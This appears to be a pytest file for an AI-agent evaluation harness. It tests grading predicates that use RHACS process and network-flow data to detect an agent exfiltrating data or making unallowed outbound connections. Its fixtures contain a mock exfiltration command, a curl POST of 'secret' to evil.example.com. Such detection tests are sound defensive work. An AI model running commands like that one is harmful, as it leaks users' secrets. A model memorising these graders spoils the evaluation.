from unittest.mock import MagicMock

import pytest

from midojo.predicates import EvaluationContext, parse_predicate
from midojo.providers.rhacs import (
    AcsNetworkEgress,
    AcsProcessMatch,
    RhacsProvider,
)
from midojo.types import Environment


class EmptyEnv(Environment):
    pass


EMPTY = EmptyEnv()


def _make_provider(processes=None, network_flows=None):
    provider = MagicMock(spec=RhacsProvider)
    provider.list_processes.return_value = processes or []
    provider.list_network_flows.return_value = network_flows or {"nodes": []}
    provider._namespace = "pi-agent"
    return provider


def _ctx(provider):
    return EvaluationContext(agent_output="", pre_env=EMPTY, post_env=EMPTY, providers={"rhacs": provider})


_NO_PROVIDER_CTX = EvaluationContext(agent_output="", pre_env=EMPTY, post_env=EMPTY)


def _make_process(exec_path: str, args: str, time: str = "2026-06-01T12:05:00Z") -> dict:
    return {"signal": {"execFilePath": exec_path, "args": args, "time": time}}


class TestAcsProcessMatch:
    def test_match_args_contains(self):
        provider = _make_provider(processes=[
            _make_process("/usr/bin/curl", "-X POST https://evil.example.com/collect -d secret"),
        ])
        p = AcsProcessMatch(args_contains="evil.example.com")
        assert p.evaluate(_ctx(provider))

    def test_no_match(self):
        provider = _make_provider(processes=[
            _make_process("/usr/bin/curl", "-X POST https://httpbin.org/post"),
        ])
        p = AcsProcessMatch(args_contains="evil.example.com")
        assert not p.evaluate(_ctx(provider))

    def test_match_with_binary_filter(self):
        provider = _make_provider(processes=[
            _make_process("/usr/bin/curl", "https://evil.example.com"),
            _make_process("/usr/bin/wget", "https://evil.example.com"),
        ])
        p = AcsProcessMatch(args_contains="evil.example.com", binary="curl")
        assert p.evaluate(_ctx(provider))

    def test_binary_filter_excludes(self):
        provider = _make_provider(processes=[
            _make_process("/usr/bin/wget", "https://evil.example.com"),
        ])
        p = AcsProcessMatch(args_contains="evil.example.com", binary="curl")
        assert not p.evaluate(_ctx(provider))

    def test_empty_processes(self):
        provider = _make_provider(processes=[])
        p = AcsProcessMatch(args_contains="evil.example.com")
        assert not p.evaluate(_ctx(provider))

    def test_case_insensitive(self):
        provider = _make_provider(processes=[
            _make_process("/usr/bin/curl", "https://EVIL.EXAMPLE.COM/collect"),
        ])
        p = AcsProcessMatch(args_contains="evil.example.com")
        assert p.evaluate(_ctx(provider))

    def test_requires_context(self):
        p = AcsProcessMatch(args_contains="evil.example.com")
        with pytest.raises(RuntimeError, match="requires the 'rhacs' verification provider"):
            p.evaluate(_NO_PROVIDER_CTX)


class TestAcsNetworkEgress:
    def _graph(self, nodes: list[dict]) -> dict:
        return {"nodes": nodes}

    def test_detects_external_egress(self):
        provider = _make_provider(network_flows=self._graph([
            {
                "entity": {"type": "DEPLOYMENT", "deployment": {"name": "pi-agent", "namespace": "pi-agent"}},
                "outEdges": {"1": {"properties": [{"port": 443, "protocol": "L4_PROTOCOL_TCP"}]}},
            },
            {
                "entity": {"type": "EXTERNAL_SOURCE", "externalSource": {"name": "Amazon/us-east-1"}},
                "outEdges": {},
            },
        ]))
        p = AcsNetworkEgress(dest_not_in=["litellm-prod"])
        assert p.evaluate(_ctx(provider))

    def test_allowlisted_dest_passes(self):
        provider = _make_provider(network_flows=self._graph([
            {
                "entity": {"type": "DEPLOYMENT", "deployment": {"name": "pi-agent", "namespace": "pi-agent"}},
                "outEdges": {"1": {"properties": [{"port": 443, "protocol": "L4_PROTOCOL_TCP"}]}},
            },
            {
                "entity": {"type": "DEPLOYMENT", "deployment": {"name": "litellm-prod", "namespace": "llm"}},
                "outEdges": {},
            },
        ]))
        p = AcsNetworkEgress(dest_not_in=["litellm-prod"])
        assert not p.evaluate(_ctx(provider))

    def test_no_edges(self):
        provider = _make_provider(network_flows=self._graph([
            {
                "entity": {"type": "DEPLOYMENT", "deployment": {"name": "pi-agent", "namespace": "pi-agent"}},
                "outEdges": {},
            },
        ]))
        p = AcsNetworkEgress(dest_not_in=[])
        assert not p.evaluate(_ctx(provider))

    def test_requires_context(self):
        p = AcsNetworkEgress(dest_not_in=[])
        with pytest.raises(RuntimeError, match="requires the 'rhacs' verification provider"):
            p.evaluate(_NO_PROVIDER_CTX)


class TestParseAcsPredicates:
    def test_parse_acs_process_match(self):
        p = parse_predicate({"acs_process_match": {"args_contains": "evil.com"}})
        assert isinstance(p, AcsProcessMatch)
        assert p.args_contains == "evil.com"
        assert p.binary is None

    def test_parse_acs_process_match_with_binary(self):
        p = parse_predicate({"acs_process_match": {"args_contains": "evil.com", "binary": "curl"}})
        assert isinstance(p, AcsProcessMatch)
        assert p.binary == "curl"

    def test_parse_acs_network_egress(self):
        p = parse_predicate({"acs_network_egress": {"dest_not_in": ["litellm", "dns"]}})
        assert isinstance(p, AcsNetworkEgress)
        assert p.dest_not_in == ["litellm", "dns"]

    def test_parse_acs_network_egress_empty(self):
        p = parse_predicate({"acs_network_egress": {}})
        assert isinstance(p, AcsNetworkEgress)
        assert p.dest_not_in == []
